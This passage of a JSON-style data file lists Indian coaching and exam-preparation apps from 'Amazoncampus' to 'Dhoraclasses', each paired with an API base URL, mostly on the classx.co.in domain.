        {"name": "Amazoncampus", "api": "https://amazoncampusapi.classx.co.in"},
        {"name": "Amitsacademy", "api": "https://amitsacademyapi.classx.co.in"},
        {"name": "Amitsilani", "api": "https://amitsilaniapi.classx.co.in"},
        {"name": "Amittaldamentorship", "api": "https://amittaldamentorshipapi.classx.co.in"},
        {"name": "Amlearning", "api": "https://amlearningapi.classx.co.in"},
        {"name": "Amolandhalea2Talk", "api": "https://amolandhalea2talkapi.classx.co.in"},
        {"name": "Amolpatil", "api": "https://amolpatilapi.classx.co.in"},
        {"name": "Amolpatilmathsreasoning", "api": "https://amolpatilmathsreasoningapi.classx.co.in"},
        {"name": "Ampledigital", "api": "https://ampledigitalapi.classx.co.in"},
        {"name": "Amplitudeclassesjaipur", "api": "https://amplitudeclassesjaipurapi.classx.co.in"},
        {"name": "Amruthaiasacademy", "api": "https://amruthaiasacademyapi.classx.co.in"},
        {"name": "Amsacademy", "api": "https://amsacademyapi.classx.co.in"},
        {"name": "Analysiseclasses", "api": "https://analysiseclassesapi.classx.co.in"},
        {"name": "Analystias", "api": "https://analystiasapi.classx.co.in"},
        {"name": "Analyticaledupointlive", "api": "https://analyticaledupointliveapi.classx.co.in"},
        {"name": "Angelacademy", "api": "https://angelacademyapi.classx.co.in"},
        {"name": "Angrezimitra", "api": "https://angrezimitraapi.classx.co.in"},
        {"name": "Anilsacademy", "api": "https://anilsacademyapi.classx.co.in"},
        {"name": "Anilsiriti", "api": "https://anilsiritiapi.classx.co.in"},
        {"name": "Animateme", "api": "https://animatemeapi.classx.co.in"},
        {"name": "Anjaneyacademy", "api": "https://anjaneyacademyapi.classx.co.in"},
        {"name": "Ankitsingh", "api": "https://ankitsinghapi.classx.co.in"},
        {"name": "Ankuramtv", "api": "https://ankuramtvapi.classx.co.in"},
        {"name": "Ankurias", "api": "https://ankuriasapi.classx.co.in"},
        {"name": "Annadatabydrrschoudhary", "api": "https://annadatadrrschoudharyapi.classx.co.in"},
        {"name": "Anrlogics", "api": "https://anrlogicsapi.classx.co.in"},
        {"name": "Anugrahaacademy", "api": "https://anugrahaacademyapi.classx.co.in"},
        {"name": "Anuragtyagiclasses", "api": "https://anuragtyagiclassesapi.classx.co.in"},
        {"name": "Anushasanclasseswhiteboardacademy", "api": "https://anushasanclassesapi.classx.co.in"},
        {"name": "Anushastudycentre", "api": "https://anushastudycentreapi.classx.co.in"},
        {"name": "Anveshangroup", "api": "https://anveshangroupapi.classx.co.in"},
        {"name": "Apexartsacademy", "api": "https://apexartsacademyapi.classx.co.in"},
        {"name": "Apexgpat", "api": "https://apexgpatapi.classx.co.in"},
        {"name": "Apinstitute", "api": "https://apinstituteapi.classx.co.in"},
        {"name": "Apnaambition", "api": "https://apnaambitionapi.classx.co.in"},
        {"name": "Apnanotes", "api": "https://apnanotesapi.classx.co.in"},
        {"name": "Apnavidyalaya", "api": "https://apnavidyalayaapi.classx.co.in"},
        {"name": "Apnipathsala", "api": "https://apnipathshalaapi.classx.co.in"},
        {"name": "Apnischool", "api": "https://apnischoolapi.classx.co.in"},
        {"name": "Apnishiksha", "api": "https://apnishikshaapi.classx.co.in"},
        {"name": "Apniuniversity", "api": "https://apniuniversityapi.classx.co.in"},
        {"name": "Appsc", "api": "https://appscapi.classx.co.in"},
        {"name": "Appxhybrid", "api": "https://appxhybridapi.classx.co.in"},
        {"name": "Appxstore", "api": "https://appxstoreapi.classx.co.in"},
        {"name": "Arex", "api": "https://arexapi.classx.co.in"},
        {"name": "Armystudy", "api": "https://armystudyliveclassesapi.classx.co.in"},
        {"name": "Arnavsir", "api": "https://arnavsirapi.classx.co.in"},
        {"name": "Arresearchpoint", "api": "https://arresearchpointapi.classx.co.in"},
        {"name": "Arshacademy", "api": "https://arshacademyapi.classx.co.in"},
        {"name": "Artshala", "api": "https://artshalaapi.classx.co.in"},
        {"name": "Arunstudies", "api": "https://arunstudiesapi.classx.co.in"},
        {"name": "Aryaninstitute", "api": "https://aryaninstituteapi.classx.co.in"},
        {"name": "Aryen", "api": "https://aryenapi.classx.co.in"},
        {"name": "Asaeducation", "api": "https://asaeducationapi.classx.co.in"},
        {"name": "Asastuti", "api": "https://asastutiapi.classx.co.in"},
        {"name": "Aseclive", "api": "https://asecliveapi.classx.co.in"},
        {"name": "Ashaacademy", "api": "https://ashaacademyapi.classx.co.in"},
        {"name": "Ashavahi", "api": "https://ashavahiapi.classx.co.in"},
        {"name": "Ashishsingh", "api": "https://ashishsinghlecturesapi.teachx.in"},
        {"name": "Ashishsinghlecturespro", "api": "https://ashishsinghlecturesapi.classx.co.in"},
        {"name": "Ashishsirphysics", "api": "https://ashishsirphysicsapi.classx.co.in"},
        {"name": "Ashokacivilservices", "api": "https://ashokacivilservicesapi.classx.co.in"},
        {"name": "Ashokagyanguru", "api": "https://ashokagyanguruapi.classx.co.in"},
        {"name": "Ashokaonlineclasses", "api": "https://ashokaonlineclassesapi.classx.co.in"},
        {"name": "Ashokatheexamguru", "api": "https://ashokaexamguruapi.classx.co.in"},
        {"name": "Ashoktechhub", "api": "https://ashoktechhubapi.classx.co.in"},
        {"name": "Ashwinclasses", "api": "https://ashwinclasseslucknowapi.classx.co.in"},
        {"name": "Ashwinpandey", "api": "https://ashwinpandeyapi.classx.co.in"},
        {"name": "Asiannursingacademy", "api": "https://asiannursingacademyapi.classx.co.in"},
        {"name": "Aspectvision", "api": "https://aspectvisionapi.classx.co.in"},
        {"name": "Aspirantjunction", "api": "https://aspirantjunctionapi.classx.co.in"},
        {"name": "Aspirantslive", "api": "https://aspirantsliveapi.classx.co.in"},
        {"name": "Aspirationstudycentre", "api": "https://aspirationstudycentreapi.classx.co.in"},
        {"name": "Aspiredefence", "api": "https://aspiredefenceapi.classx.co.in"},
        {"name": "Aspiringteachers20", "api": "https://aspiringteachersapi.classx.co.in"},
        {"name": "Asrocareers", "api": "https://asrocareersapi.classx.co.in"},
        {"name": "Assamedu", "api": "https://assameduapi.classx.co.in"},
        {"name": "Astechnic", "api": "https://astechnicapi.classx.co.in"},
        {"name": "Asthaias", "api": "https://asthaiasacademyapi.classx.co.in"},
        {"name": "Astitvaacademy", "api": "https://astitvaacademyapi.classx.co.in"},
        {"name": "Astroaauraworld", "api": "https://astroaauraworldapi.classx.co.in"},
        {"name": "Atfirsttechnologies", "api": "https://atfirsttechnologiesapi.classx.co.in"},
        {"name": "Atharvaaggarwalofficial", "api": "https://atharvaagarwalapi.classx.co.in"},
        {"name": "Atstudycentre", "api": "https://atstudycentreapi.classx.co.in"},
        {"name": "Atulyalokmanch", "api": "https://atulyalokmanchapi.classx.co.in"},
        {"name": "Augustulearning", "api": "https://augustulearningapi.classx.co.in"},
        {"name": "Aveducationalacademy", "api": "https://aveducationalacademyapi.classx.co.in"},
        {"name": "Avinashparandeshirurpattern", "api": "https://avinashparandeshirurpatternapi.classx.co.in"},
        {"name": "Avinashsharma", "api": "https://avinashsharmaapi.classx.co.in"},
        {"name": "Avishkaracademy", "api": "https://avishkaracademyapi.classx.co.in"},
        {"name": "Avp", "api": "https://avpapi.classx.co.in"},
        {"name": "Avp247", "api": "https://avp247api.classx.co.in"},
        {"name": "Awstrainingcenter", "api": "https://awstrainingcenterapi.classx.co.in"},
        {"name": "Ayurprashna", "api": "https://ayurprashnaapi.classx.co.in"},
        {"name": "Ayurvedabeingvaidya", "api": "https://ayurvedabeingvaidyaapi.classx.co.in"},
        {"name": "Ayurvedalibrary", "api": "https://ayurvedalibraryapi.classx.co.in"},
        {"name": "Ayurvedapocketapp", "api": "https://ayurvedapocketappapi.classx.co.in"},
        {"name": "Ayurvedaprakrutivikruti", "api": "https://ayurvedaprakrutivikrutiapi.classx.co.in"},
        {"name": "Azadiasacademy", "api": "https://azadiasacademyapi.classx.co.in"},
        {"name": "Azucation", "api": "https://azucationapi.classx.co.in"},
        {"name": "Babhopalacademy", "api": "https://babhopalacademyapi.classx.co.in"},
        {"name": "Backtoeducation", "api": "https://backeducationapi.classx.co.in"},
        {"name": "Badamsinghclasses", "api": "https://badamsinghclassesapi.classx.co.in"},
        {"name": "Badesirclasses", "api": "https://badesirclassesapi.classx.co.in"},
        {"name": "Balasahebbhilareacademy", "api": "https://balasahebbhilareacademyapi.classx.co.in"},
        {"name": "Baluiq", "api": "https://baluiqapi.classx.co.in"},
        {"name": "Bandhanpathshala", "api": "https://bandhanpathshalaapi.classx.co.in"},
        {"name": "Bankerspoint", "api": "https://bankerspointapi.classx.co.in"},
        {"name": "Bankerspointmaharashtra", "api": "https://bankerspointmaharastraapi.classx.co.in"},
        {"name": "Bankerszoneapp", "api": "https://bankerszoneappapi.classx.co.in"},
        {"name": "Bansallive", "api": "https://bansalliveapi.classx.co.in"},
        {"name": "Basarainstitute", "api": "https://basarainstituteapi.classx.co.in"},
        {"name": "Basicsiksha", "api": "https://basicsikshaapi.classx.co.in"},
        {"name": "Bbaacademy", "api": "https://bbaacademyapi.classx.co.in"},
        {"name": "Bbcstudy", "api": "https://bbcstudyapi.classx.co.in"},
        {"name": "Bbn", "api": "https://bbnapi.classx.co.in"},
        {"name": "Be10X", "api": "https://be10xapi.classx.co.in"},
        {"name": "Beastlearners", "api": "https://beastlearnersapi.classx.co.in"},
        {"name": "Beatexams", "api": "https://beatexamsapi.classx.co.in"},
        {"name": "Bebankersanreetiacademy", "api": "https://bebankerapi.classx.co.in"},
        {"name": "Beeclassesbyghogaresir", "api": "https://beeclassesbyghogaresirapi.classx.co.in"},
        {"name": "Beepublication", "api": "https://beepublicationapi.classx.co.in"},
        {"name": "Beetaacademy", "api": "https://beetaacademyapi.classx.co.in"},
        {"name": "Beforebiology", "api": "https://beforebiologyapi.classx.co.in"},
        {"name": "Beingaspirant", "api": "https://beingaspirantapi.classx.co.in"},
        {"name": "Beingdoctor", "api": "https://beingdoctorapi.classx.co.in"},
        {"name": "Beparwahiacademy", "api": "https://beparwahiacademyapi.classx.co.in"},
        {"name": "Bepecexperiencetherealtime", "api": "https://bepecexperiencerealtimeapi.classx.co.in"},
        {"name": "Bestacad", "api": "https://bestacadapi.classx.co.in"},
        {"name": "Betterenroll", "api": "https://betterenrollapi.classx.co.in"},
        {"name": "Bhagirathiasacademy", "api": "https://bhagirathiasacademyapi.classx.co.in"},
        {"name": "Bhambhusirhindi", "api": "https://bhambhusirhindiapi.classx.co.in"},
        {"name": "Bharariacademy", "api": "https://bharariacademyapi.classx.co.in"},
        {"name": "Bharatiasacademy", "api": "https://bharatiasacademyapi.classx.co.in"},
        {"name": "Bharatjobs", "api": "https://bharatjobsapi.classx.co.in"},
        {"name": "Bharatsikshaacademy", "api": "https://bharatsikshaacademyapi.classx.co.in"},
        {"name": "Bharti", "api": "https://bhartilearningapi.appx.co.in"},
        {"name": "Bhashmiacademy", "api": "https://bhashmiacademyapi.classx.co.in"},
        {"name": "Bhavishyaacademy", "api": "https://bhavishyaacademyapi.classx.co.in"},
        {"name": "Bhavishyabhartiranchi", "api": "https://bhavishyabhartiranchiapi.classx.co.in"},
        {"name": "Bhavyainstitution", "api": "https://bhavyainstitutionapi.classx.co.in"},
        {"name": "Bhawanisinghchundawathindi", "api": "https://bhawanisinghchundawathindiapi.classx.co.in"},
        {"name": "Bhualumnismartsolution", "api": "https://bhualumnismartsolutionapi.classx.co.in"},
        {"name": "Bhupendrasinghdinkar", "api": "https://bhupendrasinghdinkarapi.classx.co.in"},
        {"name": "Bhushanmpscacademy", "api": "https://bhushanmpscacademyapi.classx.co.in"},
        {"name": "Bicebiswasinstitute", "api": "https://bicebiswasinstituteapi.classx.co.in"},
        {"name": "Big20", "api": "https://big20appapi.classx.co.in"},
        {"name": "Bigbangbogan", "api": "https://bigbangboganapi.classx.co.in"},
        {"name": "Biharboardeducation", "api": "https://biharboardeducationapi.classx.co.in"},
        {"name": "Biharsmartclasses", "api": "https://biharsmartclassesapi.classx.co.in"},
        {"name": "Biologyinhindi", "api": "https://biologyinhindiapi.classx.co.in"},
        {"name": "Biplawstudycentrebsc", "api": "https://biplawstudycentreapi.classx.co.in"},
        {"name": "Birensirodia", "api": "https://birensirodiaapi.classx.co.in"},
        {"name": "Biswaniclasses", "api": "https://biswaniclassesapi.classx.co.in"},
        {"name": "Bitsyuva", "api": "https://bitsyuvaapi.classx.co.in"},
        {"name": "Bookmyvideo", "api": "https://bookmyvideoapi.classx.co.in"},
        {"name": "Bookrox", "api": "https://bookroxapi.classx.co.in"},
        {"name": "Bookup", "api": "https://bookupapi.classx.co.in"},
        {"name": "Bookwormacademy", "api": "https://bookwormacademyapi.classx.co.in"},
        {"name": "Boosteracademy", "api": "https://boosteracademyapi.classx.co.in"},
        {"name": "Bpnmath", "api": "https://bpnmathapi.classx.co.in"},
        {"name": "Bpscacademy", "api": "https://bpscacademyapi.classx.co.in"},
        {"name": "Bpscadda247", "api": "https://bpscadda247api.classx.co.in"},
        {"name": "Bpscscore", "api": "https://bpscscoreapi.classx.co.in"},
        {"name": "Bpsczone", "api": "https://bpsczoneapi.classx.co.in"},
        {"name": "Brahmasmi", "api": "https://brahmasmiapi.classx.co.in"},
        {"name": "Brahmieducation", "api": "https://brahmieducationapi.classx.co.in"},
        {"name": "Brainbulb", "api": "https://brainbulbapi.classx.co.in"},
        {"name": "Brainerygroupvod", "api": "https://brainerygroupvodapi.classx.co.in"},
        {"name": "Brainq", "api": "https://brainqapi.classx.co.in"},
        {"name": "Brclasses", "api": "https://brclassesapi.classx.co.in"},
        {"name": "Brightacademy", "api": "https://brightacademyapi.classx.co.in"},
        {"name": "Brightpublication", "api": "https://brightpublicationapi.classx.co.in"},
        {"name": "Brilliantcommerceclassespune", "api": "https://brilliantcommerceclassespuneapi.classx.co.in"},
        {"name": "Brilliantguru", "api": "https://brilliantguruapi.classx.co.in"},
        {"name": "Brillianttestseries", "api": "https://brillianttestseriesapi.classx.co.in"},
        {"name": "Brotherhooddefence", "api": "https://brotherhooddefenceapi.classx.co.in"},
        {"name": "Bsclearningapp", "api": "https://bsclearningappapi.classx.co.in"},
        {"name": "Bscproclasses", "api": "https://bscproclassesapi.classx.co.in"},
        {"name": "Bscwithrambabusir", "api": "https://bscrambabusirapi.classx.co.in"},
        {"name": "Bsgurukul", "api": "https://bsgurukulapi.classx.co.in"},
        {"name": "Bsppharmacyofficial", "api": "https://bsppharmacyapi.classx.co.in"},
        {"name": "Bualbuleslive", "api": "https://bualbulesliveapi.classx.co.in"},
        {"name": "Bumbexfull", "api": "https://bumbexfullapi.classx.co.in"},
        {"name": "Bypradipbodhale", "api": "https://paripurnmarathivyakaranapi.classx.co.in"},
        {"name": "Bystudy", "api": "https://bystudyapi.classx.co.in"},
        {"name": "Cadetsdefencacademy", "api": "https://cadetsdefenceacademyapi.classx.co.in"},
        {"name": "Cadetspointlearningapp", "api": "https://cadetspointlearningappapi.classx.co.in"},
        {"name": "Canonline", "api": "https://canonlineapi.classx.co.in"},
        {"name": "Canvasclasses", "api": "https://canvasclassesapi.classx.co.in"},
        {"name": "Capfacmentors", "api": "https://capfacmentorsapi.classx.co.in"},
        {"name": "Caramanluthraclasses", "api": "https://caramanluthraclassesapi.classx.co.in"},
        {"name": "Carbacademy", "api": "https://carbacademyapi.classx.co.in"},
        {"name": "Careerado", "api": "https://careeradoapi.classx.co.in"},
        {"name": "Careerbooster", "api": "https://careerboosterapi.classx.co.in"},
        {"name": "Careerclassesjaipur", "api": "https://careerclassesjaipurapi.classx.co.in"},
        {"name": "Careerhub", "api": "https://careerhubapi.classx.co.in"},
        {"name": "Careermirror", "api": "https://careermirrorapi.classx.co.in"},
        {"name": "Careernow", "api": "https://careernowapi.classx.co.in"},
        {"name": "Careerstudy", "api": "https://careerstudyapi.classx.co.in"},
        {"name": "Careerupdatebyengineer", "api": "https://careerupdatebyengineerapi.classx.co.in"},
        {"name": "Careerupshillong", "api": "https://careerupshillongapi.classx.co.in"},
        {"name": "Careervijay", "api": "https://careervijayapi.classx.co.in"},
        {"name": "Careerwave", "api": "https://careerwaveapi.classx.co.in"},
        {"name": "Careerwin", "api": "https://careerwinapi.classx.co.in"},
        {"name": "Careerwitharun", "api": "https://careerarunapi.classx.co.in"},
        {"name": "Carrierkatta", "api": "https://carrierkattaapi.classx.co.in"},
        {"name": "Casepage", "api": "https://casepageapi.classx.co.in"},
        {"name": "Catalystsoni", "api": "https://catalystsoniapi.classx.co.in"},
        {"name": "Cayatra", "api": "https://cayatraapi.classx.co.in"},
        {"name": "Cccwifistudy", "api": "https://cccwifistudyapi.classx.co.in"},
        {"name": "Cdacareerdishariacademy", "api": "https://cdacareerdishariacademyapi.classx.co.in"},
        {"name": "Cdacpreparation", "api": "https://cdacpreparationapi.classx.co.in"},
        {"name": "Cdpmastilearningapp", "api": "https://cdpmastilearningappapi.classx.co.in"},
        {"name": "Ceadclasses", "api": "https://ceadclassesapi.classx.co.in"},
        {"name": "Centuriondefenceacademy", "api": "https://centuriondefenceacademyapi.classx.co.in"},
        {"name": "Centurionstudypoint", "api": "https://centurionstudypointapi.classx.co.in"},
        {"name": "Cetqualifiers", "api": "https://cetqualifiersapi.classx.co.in"},
        {"name": "Cgpscknowledgehubpscwala", "api": "https://cgpscknowledgehubapi.classx.co.in"},
        {"name": "Cgpscmapology", "api": "https://cgpscmapologyapi.classx.co.in"},
        {"name": "Cgpscwiseup", "api": "https://cgpscwiseupapi.classx.co.in"},
        {"name": "Chaloseekho", "api": "https://chaloseekhoapi.classx.co.in"},
        {"name": "Champcircle", "api": "https://champcircleapi.classx.co.in"},
        {"name": "Championsiitmedical", "api": "https://championsiitmedicalapi.classx.co.in"},
        {"name": "Champsacademy", "api": "https://champsacademyapi.classx.co.in"},
        {"name": "Champsclassesprepjeet", "api": "https://champsclassesapi.classx.co.in"},
        {"name": "Chanakyachamps", "api": "https://chanakyachampsapi.classx.co.in"},
        {"name": "Chanakyadefenceacademy", "api": "https://chanakyadefenceacademyapi.classx.co.in"},
        {"name": "Chanakyaphysicalacademy", "api": "https://chanakyaphysicalacademyapi.classx.co.in"},
        {"name": "Chandanclasses", "api": "https://chandanclassesapi.classx.co.in"},
        {"name": "Chandanlogic", "api": "https://newchandanlogicsapi.classx.co.in"},
        {"name": "Chandanmishrabusinesscoach", "api": "https://chandanmishrabusinesscoachapi.classx.co.in"},
        {"name": "Chankshyamandalforupscandmpsc", "api": "https://chankshyamandalupscmpscapi.classx.co.in"},
        {"name": "Charikrishnasirclasses", "api": "https://charikrishnasirclassesapi.classx.co.in"},
        {"name": "Charteredcommerce", "api": "https://charteredcommerceapi.classx.co.in"},
        {"name": "Chauhanlawacademy", "api": "https://chauhanlawacademyapi.classx.co.in"},
        {"name": "Chemacademy", "api": "https://chemacademyapi.classx.co.in"},
        {"name": "Chemistrybyanilsir", "api": "https://chemistryanilsirapi.classx.co.in"},
        {"name": "Chemistryforyou", "api": "https://chemistryforyouapi.classx.co.in"},
        {"name": "Chemistryguruji", "api": "https://chemistrygurujiapi.classx.co.in"},
        {"name": "Chemistrypro", "api": "https://chemistryproapi.classx.co.in"},
        {"name": "Chemistrywallahvvr", "api": "https://chemistrywallahvvrapi.classx.co.in"},
        {"name": "Chemphy", "api": "https://chemphyapi.classx.co.in"},
        {"name": "Chengdedohipode", "api": "https://chengdedohipodeapi.classx.co.in"},
        {"name": "Chhoteiasthelearningapp", "api": "https://chhoteiaslearningapi.classx.co.in"},
        {"name": "Chinmayacademy", "api": "https://chinmayacademyapi.classx.co.in"},
        {"name": "Chiralacademy", "api": "https://chiralacademyapi.classx.co.in"},
        {"name": "Choutiseconomy", "api": "https://choutiseconomyapi.classx.co.in"},
        {"name": "Chrisedutech", "api": "https://chrisedutechapi.classx.co.in"},
        {"name": "Christopher", "api": "https://christopherapi.classx.co.in"},
        {"name": "Chunchunstudyacademy", "api": "https://chunchunstudyacademyapi.classx.co.in"},
        {"name": "Cityeducation", "api": "https://cityeducationapi.classx.co.in"},
        {"name": "Civilanalystcareer", "api": "https://civilanalystcareerapi.classx.co.in"},
        {"name": "Civilservices", "api": "https://studycivilservicesapi.classx.co.in"},
        {"name": "Civilsguruias", "api": "https://civilsguruiasapi.classx.co.in"},
        {"name": "Civiltaiyari", "api": "https://civiltaiyariapi.classx.co.in"},
        {"name": "Civiltechsolution", "api": "https://civiltechsolutionapi.classx.co.in"},
        {"name": "Cjclasses", "api": "https://cjclassesapi.classx.co.in"},
        {"name": "Clarifyknowledge", "api": "https://clarifyknowledgeapi.classx.co.in"},
        {"name": "Class24Byparwezsir", "api": "https://class24parwezsirapi.classx.co.in"},
        {"name": "Classhour", "api": "https://classhourapi.classx.co.in"},
        {"name": "Classtest", "api": "https://classtestappxapi.classx.co.in"},
        {"name": "Clatiansaguideforlawaspirants", "api": "https://clatiansapi.classx.co.in"},
        {"name": "Clearvisionclasses", "api": "https://clearvisionclassesapi.classx.co.in"},
        {"name": "Cloudtech", "api": "https://cloudtechapi.classx.co.in"},
        {"name": "Cmccareer", "api": "https://cmccareerapi.classx.co.in"},
        {"name": "Cmcindore", "api": "https://cmcindoreapi.classx.co.in"},
        {"name": "Cmpforupscmpsc", "api": "https://chanakyamandalpariwarapi.classx.co.in"},
        {"name": "Cnachievers", "api": "https://cnachieversapi.classx.co.in"},
        {"name": "Cnreddyacademy", "api": "https://cnreddyacademyapi.classx.co.in"},
        {"name": "Coachify", "api": "https://coachifyapi.classx.co.in"},
        {"name": "Coachingwithradhesir", "api": "https://coachingradhesirapi.classx.co.in"},
        {"name": "Coceducation", "api": "https://coceducationapi.classx.co.in"},
        {"name": "Codegenie", "api": "https://codegenieapi.classx.co.in"},
        {"name": "Codewithanurag", "api": "https://codewithanuragapi.classx.co.in"},
        {"name": "Codewithashhad", "api": "https://codeashhadapi.classx.co.in"},
        {"name": "Codingcontentcreator", "api": "https://codingcontentcreatorapi.classx.co.in"},
        {"name": "Codingseekho", "api": "https://codingseekhoapi.classx.co.in"},
        {"name": "Codingwallahsir", "api": "https://codingwallahsirapi.classx.co.in"},
        {"name": "Combinecrux", "api": "https://combinecruxapi.classx.co.in"},
        {"name": "Commerceassetsinstitute", "api": "https://commerceassetsinstituteapi.classx.co.in"},
        {"name": "Commerceinsightselearning", "api": "https://commerceinsightselearningapi.classx.co.in"},
        {"name": "Commercenation", "api": "https://commercenationapi.classx.co.in"},
        {"name": "Commercenationpro", "api": "https://commercenationproapi.classx.co.in"},
        {"name": "Commercewaleguruji", "api": "https://commercewalegurujiapi.classx.co.in"},
        {"name": "Commercewithvinay", "api": "https://commercevinayapi.classx.co.in"},
        {"name": "Competishun", "api": "https://competishunapi.classx.co.in"},
        {"name": "Competitionacademydigitalclasses", "api": "https://competitionacademydigitalclassesapi.classx.co.in"},
        {"name": "Competitionguru", "api": "https://competitionguruapi.classx.co.in"},
        {"name": "Competitionmaterialharyana", "api": "https://competitionmaterialharayanaapi.classx.co.in"},
        {"name": "Competitionmathpoint", "api": "https://competitionmathpointapi.classx.co.in"},
        {"name": "Competitionprobymkmishra", "api": "https://competitionpromkmishraapi.classx.co.in"},
        {"name": "Competitivepharma", "api": "https://competitivepharmaapi.classx.co.in"},
        {"name": "Computech", "api": "https://computechapi.classx.co.in"},
        {"name": "Comrcio", "api": "https://comercioapi.classx.co.in"},
        {"name": "Conceptclaritywala", "api": "https://conceptclaritywalaapi.classx.co.in"},
        {"name": "Conceptclasses", "api": "https://conceptclassesapi.classx.co.in"},
        {"name": "Conceptseekho", "api": "https://conceptseekhoapi.classx.co.in"},
        {"name": "Conceptup", "api": "https://conceptupapi.classx.co.in"},
        {"name": "Constantguide", "api": "https://constantguideapi.classx.co.in"},
        {"name": "Cosmosclasses", "api": "https://cosmosclassesapi.classx.co.in"},
        {"name": "Cosmossikaraninstituteofgeography", "api": "https://cosmossikarapi.classx.co.in"},
        {"name": "Coursee", "api": "https://courseeapi.classx.co.in"},
        {"name": "Cpyadavclasses", "api": "https://cpyadavclassesapi.classx.co.in"},
        {"name": "Crackcuetexam", "api": "https://crackcuetexamapi.classx.co.in"},
        {"name": "Crackerexamhub", "api": "https://crackerexamhubapi.classx.co.in"},
        {"name": "Crackexampurvi", "api": "https://crackexampurviapi.classx.co.in"},
        {"name": "Crackparikshachandanlogicsold", "api": "https://chandanlogicsapi.classx.co.in"},
        {"name": "Crackvision", "api": "https://crackvisionapi.classx.co.in"},
        {"name": "Createu", "api": "https://createuapi.classx.co.in"},
        {"name": "Creativechemistry", "api": "https://creativechemistryapi.classx.co.in"},
        {"name": "Creativecomputer", "api": "https://creativecomputerapi.classx.co.in"},
        {"name": "Crisscrossclasses", "api": "https://crisscrossclassesapi.classx.co.in"},
        {"name": "Cropcosagriedutech", "api": "https://cropcosagriapi.classx.co.in"},
        {"name": "Csacivilservicesacademy", "api": "https://civilservicesacademyapi.classx.co.in"},
        {"name": "Csatbykabirsir", "api": "https://csatkabirsirapi.classx.co.in"},
        {"name": "Csclassroom", "api": "https://csclassroomapi.classx.co.in"},
        {"name": "Csmaths", "api": "https://csmathsapi.classx.co.in"},
        {"name": "Cstutorugcnetgyan", "api": "https://cstutorapi.classx.co.in"},
        {"name": "Ctcclasses", "api": "https://ctcclassesapi.classx.co.in"},
        {"name": "Cuetechratneshpandey", "api": "https://cuetechapi.classx.co.in"},
        {"name": "Cuetprep", "api": "https://cuetprepapi.classx.co.in"},
        {"name": "Currentaffairsbyshrikanttayade", "api": "https://currentaffairsbyshrikanttayadeapi.classx.co.in"},
        {"name": "D2Techlab", "api": "https://d2techlabapi.classx.co.in"},
        {"name": "Dabrasirscience", "api": "https://dabrasirscienceapi.classx.co.in"},
        {"name": "Dagdushethupscacademy", "api": "https://dagdushethupscacademyapi.classx.co.in"},
        {"name": "Dagur", "api": "https://daguracademyapi.teachx.in"},
        {"name": "Dagursacademy", "api": "https://daguracademyapi.classx.co.in"},
        {"name": "Dailypractice", "api": "https://dailypracticeapi.classx.co.in"},
        {"name": "Darshanikias", "api": "https://darshanikiasapi.classx.co.in"},
        {"name": "Dazzlingcareer", "api": "https://dazzlingcareerapi.classx.co.in"},
        {"name": "Dbmcimdslive", "api": "https://dbmcimdsliveapi.classx.co.in"},
        {"name": "Dbstudyhub", "api": "https://dbstudyhubapi.classx.co.in"},
        {"name": "Dccinstitute", "api": "https://dccinstituteapi.classx.co.in"},
        {"name": "Dcclasses", "api": "https://dcclassesapi.classx.co.in"},
        {"name": "Dcjantabysarvantsir", "api": "https://dcjantasarvantsirapi.classx.co.in"},
        {"name": "Deargurujiofficial", "api": "https://gurujiofficialapi.classx.co.in"},
        {"name": "Dearlearners", "api": "https://dearlearnersapi.classx.co.in"},
        {"name": "Dearsirbarisir", "api": "https://dearsirbarisirapi.classx.co.in"},
        {"name": "Deccanias", "api": "https://deccaniasapi.classx.co.in"},
        {"name": "Decodingsports", "api": "https://decodingsportsapi.classx.co.in"},
        {"name": "Deebha", "api": "https://deebhaapi.classx.co.in"},
        {"name": "Deepakclasses", "api": "https://deepakclassesapi.classx.co.in"},
        {"name": "Deepakeducationhub", "api": "https://deepakeducationhubapi.classx.co.in"},
        {"name": "Deepeducation", "api": "https://deepeducationapi.classx.co.in"},
        {"name": "Deepikaclasses", "api": "https://deepikaclassesapi.classx.co.in"},
        {"name": "Deeptisinghacademy", "api": "https://deeptisinghacademyapi.classx.co.in"},
        {"name": "Defencedarling", "api": "https://defencedarlingapi.classx.co.in"},
        {"name": "Defencefighter", "api": "https://defencefighterapi.classx.co.in"},
        {"name": "Defencemania", "api": "https://defencemania2api.classx.co.in"},
        {"name": "Defencesadhanacdscapfacndaafcat", "api": "https://defencesadhanaapi.classx.co.in"},
        {"name": "Defencezonekanpur", "api": "https://defencezoneapi.classx.co.in"},
        {"name": "Degreemathstutorialdmtlogics", "api": "https://degreemathstutorialapi.classx.co.in"},
        {"name": "Dehradunclasses", "api": "https://dehradunclassesapi.classx.co.in"},
        {"name": "Delhipoliceconstable2023", "api": "https://delhipoliceconstableapi.classx.co.in"},
        {"name": "Delhisecrets", "api": "https://delhisecretsapi.classx.co.in"},
        {"name": "Deserveias", "api": "https://deserveiasapi.classx.co.in"},
        {"name": "Desiretolearn", "api": "https://desiretolearnapi.classx.co.in"},
        {"name": "Destinationias", "api": "https://destinationiasapi.classx.co.in"},
        {"name": "Devgktricks", "api": "https://devgktricksapi.classx.co.in"},
        {"name": "Dfglory", "api": "https://dfgloryapi.classx.co.in"},
        {"name": "Dgscaps", "api": "https://dgscapsapi.classx.co.in"},
        {"name": "Dhaapps", "api": "https://dhaappsapi.classx.co.in"},
        {"name": "Dhakadcoachingrameshwarsir", "api": "https://dhakadcoachingrameshwarsirapi.classx.co.in"},
        {"name": "Dhakadconcept", "api": "https://dhakadconceptapi.classx.co.in"},
        {"name": "Dhananjayias", "api": "https://dhananjayiasacademyapi.classx.co.in"},
        {"name": "Dhanbadmathsacademy", "api": "https://dhanbadmathsacademyapi.classx.co.in"},
        {"name": "Dhangarchemistrylecturepro", "api": "https://dhangarchemistrylectureproapi.classx.co.in"},
        {"name": "Dhankharclasses", "api": "https://dhankharclassesapi.classx.co.in"},
        {"name": "Dharmendrasociology", "api": "https://dharmendrasociologyapi.classx.co.in"},
        {"name": "Dharoharclasses", "api": "https://dharoharclassesapi.classx.co.in"},
        {"name": "Dharteeeducation", "api": "https://dharteeeducationapi.classx.co.in"},
        {"name": "Dhasusir", "api": "https://dhasusiracademyapi.teachx.in"},
        {"name": "Dhasusiracademy", "api": "https://dhasusiracademyapi.classx.co.in"},
        {"name": "Dhaygudeacademy", "api": "https://dhaygudeacademysataraapi.classx.co.in"},
        {"name": "Dheyapurtifoundation", "api": "https://dheyapurtifoundationapi.classx.co.in"},
        {"name": "Dhoraclasses", "api": "https://dhoraclassesapi.classx.co.in"},
